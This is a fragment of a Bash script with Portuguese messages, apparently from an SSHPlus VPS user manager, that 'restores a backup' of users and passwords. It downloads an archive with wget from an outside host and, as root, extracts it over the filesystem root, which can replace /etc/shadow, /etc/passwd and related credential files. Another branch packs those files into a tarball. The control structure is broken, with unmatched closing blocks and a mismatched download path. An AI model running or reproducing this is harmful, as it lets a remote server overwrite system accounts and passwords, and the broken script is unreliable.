#!/bin/bash

rm /backup.vps
rm /root/backup.vps

sleep 2
wget central.seguidoresbrazil.store:81/backup/backup.vps
sleep 5	
	clear
if [ -f "/root/backup.vps" ]
		then
			echo ""
			echo -e "\033[1;36mRestaurando backup..."
			echo ""
			sleep 2s
			cp /root/backup.vps /backup.vps
			cd /
			tar -xvf backup.vps
			rm /backup.vps
			echo ""
			echo -e "\033[1;36mUsuários e\033[1;36m senhas importados com sucesso.\033[0m"
			echo ""
			exit
		else
			echo ""
			echo -e "\033[1;33mO arquivo \033[1;32mbackup.vps \033[1;33mnão foi encontrado!\033[0m"
			echo -e "\033[1;33mCeritifique-se que ele esteja localizado no diretório /root/ com o nome \033[1;32mbackup.vps\033[0m"
			echo ""
			exit
		fi
	fi
	if [[ "$opcao" = '3' ]]; then
		menu
	fi
} || {
	rm /root/backup.vps 1>/dev/null 2>/dev/null
	tar cvf /root/backup.vps /root/usuarios.db /etc/shadow /etc/passwd /etc/group /etc/gshadow /etc/bot /etc/SSHPlus/senha > /dev/null 2>&1
	[[ -d "/etc/SSHPlus/backups" ]] && mv /root/backup.vps /etc/SSHPlus/backups/backup.vps
	exit
}
